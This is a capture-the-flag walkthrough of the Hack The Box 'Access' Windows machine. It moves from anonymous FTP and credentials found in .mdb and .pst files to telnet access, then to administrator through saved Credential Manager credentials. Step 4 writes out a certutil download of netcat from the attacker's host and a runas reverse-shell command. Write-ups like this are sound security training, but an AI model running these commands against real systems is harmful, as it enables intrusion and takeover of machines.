# ACCESS
**Operating System**: _Windows_  
**HTB Difficulty**: _Easy_  
**My Recommended Difficulty**: _Easy_  
**Summary**: _This scenario offers a good introduction into dissecting unfamiliar data types such as .mdb and .pst where cleartext credentials offer an avenue for initial access. From there, the scenario presents a straightforward abuse of the Windows Credential Manager to establish a reverse shell as the local administrator._  


### STEP #1: Port Scanning
**TCP Scan**
* `sudo nmap -Pn -n X.X.X.X -sC -sV -sT -p- --open`  

  * <img width="793" height="372" alt="image" src="https://github.com/user-attachments/assets/21c7ba46-759b-4792-a0e3-a042f2076626" />

  
**UDP Scan**
* `nmap -v -sU -T4 -Pn --top-ports 100 X.X.X.X`  

  * No results.

Our port scans discovered three interesting services/protocols open on this system that we will want to deep dive in our enumeration phase.

### STEP #2: Service Enumeration
**FTP Service**  
Common FTP enumeration involves looking for old/vulnerable versions, checking for anonymous logins, and checking for default credentials. We see from our port scan that anonymous login appears to be allowed so this will be a good place to start our enumeration.
* Active FTP Connection: `ftp -A anonymous@X.X.X.X`, then leave the password blank.
  * <img width="564" height="199" alt="image" src="https://github.com/user-attachments/assets/5411684a-4c08-4500-903c-a24bddc61ad9" />  
  * We find two directories, _Backups_ and _Engineer_. In order to deep dive the contents of these directories, we can return to our command line (type `bye` in the FTP sesssion) and download the contents of both directories.  
    * `wget -r -l 10 --no-passive-ftp --ftp-user='anonymous' --ftp-password='' ftp://X.X.X.X/*`
   
**Backups Directory**
  * Inside the _Backups_ directory, we find a file named _backup.mdb_. We can view the tables inside this database file using `mdb-tables backup.mdb`.
    * <img width="1285" height="214" alt="image" src="https://github.com/user-attachments/assets/6ab3b97d-7b91-42f8-8699-25f679ce8729" />
      
  * A lot of table names appear. We could inspect these individually but we are primarily interested in finding a table that might contain credentials (usernames and/or passwords). Therefore, the table _auth_user_ stands out to me. We can inspect the contents of this table using `mdb-export backup.mdb auth_user`.
    * <img width="480" height="89" alt="image" src="https://github.com/user-attachments/assets/0a1b5bc7-7b5b-41cb-b381-6657362ceaed" />
    
  * Jackpot! We find a list of three users and possible passwords. When we find credentials, we want to make sure to store them in a file so that we can enumerate combinations of usernames and passwords easily. The image below shows the three discovered usernames in a file named _users_ (left column) and the two discovered passwords in a file named _passwords_ (right column). We will hold onto these and continue our enumeration.
    * <img width="435" height="70" alt="image" src="https://github.com/user-attachments/assets/00dc5a02-1283-4295-8ace-eec5b4b108bb" />  

**Engineer Directory**
  * Inside the _Engineer_ directory, we find a file named _Access Control.zip_. We can try and extract the contents of the file using `7z x 'Access Control.zip'`. We are prompted for a password, which we leave blank and promptly obtain an error. It would appear that this file is password protected.
    * <img width="673" height="376" alt="image" src="https://github.com/user-attachments/assets/775bea79-0be1-4368-a0b8-32c847299ade" />
    
  * We proceed to attempt to crack the password on this file using the password list created earlier and find that  _access4u@security_ successfully decrypts the file. Inside, we find a file named _'Access Control.pst'_. _.pst_ files are Microsoft Outlook files and can be read using the following commands:
    * `lspst 'Access Control.pst'` to list PST file data.
      * <img width="733" height="41" alt="image" src="https://github.com/user-attachments/assets/0a80b135-7b60-4f89-acfc-cc0df1a8e29f" />
  
    * `readpst 'Access Control.pst` to convert the PST file to mbox file that can be read in clear text (`cat 'Access Control.mbox'`). The file is longer but I have provided a useful snippet from the output in the picture below.
      * <img width="1053" height="236" alt="image" src="https://github.com/user-attachments/assets/7667b723-4edb-4449-92c5-65a0fe28b403" />  

  * Having read the email file,, we are able to deduce that an email was sent from _john@megacorp.com_ regarding a password change to an account named _security_, and the corresponding new password! Let's make sure to append both _john_ and _security_ to our username list and then append _4Cc3ssC0ntr0ller_ to our password list.
    * <img width="429" height="100" alt="image" src="https://github.com/user-attachments/assets/17a34e3e-286f-4548-830a-782ad931544e" />

This has been an incredibly successful FTP enumeration! We will now continue to our next service.

**Telnet Service**  
Outside of abusing vulnerable versions of telnet or accessing open connections, there isn't too much we can do in terms of enumeration and we quickly find that this is not an open connection (`telnet X.X.X.X`) since we are presented with a login prompt. Let's attempt to use the credentials we have discovered in our FTP enumeration. This can be done manually entering each combination where we will find that _security:4Cc3ssC0ntr0ller_ successfully logs in.
  * <img width="310" height="150" alt="image" src="https://github.com/user-attachments/assets/95ece4cd-5178-460b-a67b-af2458ba4cb6" />

NOTE: We did not perform HTTP enumeration in this walk through because it does not yield any information useful to this machine but we should always be thorough in our enumeration as information discovered at this phase can still be useful to privilege escalation.


### STEP #3: Initial Access
Initial access was achieved via the telnet service using credentials discovered through FTP enumeration. The user flag (_user.txt_) can be found at _C:\Users\security\Desktop_.


### STEP #4: Internal Enumeration + Privilege Escalation
While performing internal enumeration, we discover that the local administrator account credentials are stored in the Windows credential manager (`cmdkey /list`).
  * <img width="619" height="180" alt="image" src="https://github.com/user-attachments/assets/fd893a67-ff16-4767-ae87-7c0db581cd28" />

When we find credentials stored in the credential manager, we can attempt to use the stored credentials to run commands using `runas /savecred /user:USERNAME "COMMAND"`. Alternatively, we could try and crack the credentials but this is a more complicated process and should be reserved for when we can't abuse the _runas_ solution. For this machine, I will try and use the administrator credentials to establish a reverse shell back to my system using netcat. Using the commands below, I hosted a web server containing nc64.exe on my Kali system and used my session as the _security_ user to upload the file to the _ACCESS_ machine. From there, I start a listener on my Kali system and then issue the malicious _runas_ command to establish a reverse shell.
  * KALI: `python3 -m http.server 80`
  * ACCESS: `certutil -urlcache -f http://<KALI_IP_ADDRESS>/nc64.exe nc64.exe`
  * KALI: `rlwrap nc -lvnp 21`
    * _NOTE: I used port 21 to listen for the shell to limit the risk of firewall restrictions. We know that ACCESS is listening on port 21 so there is a higher chance of success when using a port that the victim system already has open._
    * ACCESS: `runas /savecred /user:Administrator "nc64.exe <KALI_IP_ADDRESS> 21 -e cmd.exe"`
      * <img width="503" height="137" alt="image" src="https://github.com/user-attachments/assets/bbdcfd15-3289-43e4-a896-5daa6c08d8dd" />

We were able to successfully achieve a shell as the local administrator and obtain the root flag (_root.txt_) found at _C:\Users\Administrator\Desktop_.  


_While this scenario demonstrated a very simple and straightforward privilege escalation path, we would normally have run winpeas to perform a thorough internal enumeration and detect attack vectors we can pursue._
